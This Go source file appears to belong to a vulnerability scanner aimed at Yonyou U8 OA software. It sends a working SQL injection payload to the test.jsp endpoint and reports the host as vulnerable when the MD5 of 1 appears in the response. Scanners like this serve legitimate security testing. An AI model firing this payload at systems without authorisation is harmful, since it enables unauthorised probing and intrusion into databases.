package Scan

import (
	"FoPoForYonyou2.0/Utils"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"strings"
	"time"
)

func YyOaSqlScan(address string, client *http.Client, Red string, Green string, Yellow string, Reset string, Cyan string, currentTime string) {
	yyoasql := "用友 U8 OA test.jsp SQL注入漏洞"
	urls := address + "/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20MD5(1))"
	response, _ := client.Get(urls)
	defer response.Body.Close()

	if response.StatusCode == http.StatusOK {
		body, _ := ioutil.ReadAll(response.Body)
		if strings.Contains(string(body), "c4ca4238a0b") {
			result4 := yyoasql + "：" + urls
			//保存文件不能用传来的currentTime，得重新定义一个格式的时间戳
			timestamp := time.Now().Format("20230712")
			filename := fmt.Sprintf("scan_result_%s.txt", timestamp)
			err := Utils.SaveResultToFile(result4, filename)
			if err != nil {
				log.Println("保存结果到文件出错:", err)
			} else {

			}
			output := fmt.Sprintf("["+Green+"%s"+Reset+"] ["+Green+"+"+Reset+"] 存在%s：%s", currentTime, yyoasql, urls)
			fmt.Println(output)
		} else {
			output := fmt.Sprintf("["+Cyan+"%s"+Reset+"] ["+Yellow+"-"+Reset+"] 不存在%s ", currentTime, yyoasql)
			fmt.Println(output)
		}
	} else {
		output := fmt.Sprintf("["+Cyan+"%s"+Reset+"] ["+Yellow+"-"+Reset+"] 不存在%s ", currentTime, yyoasql)
		fmt.Println(output)
	}
}
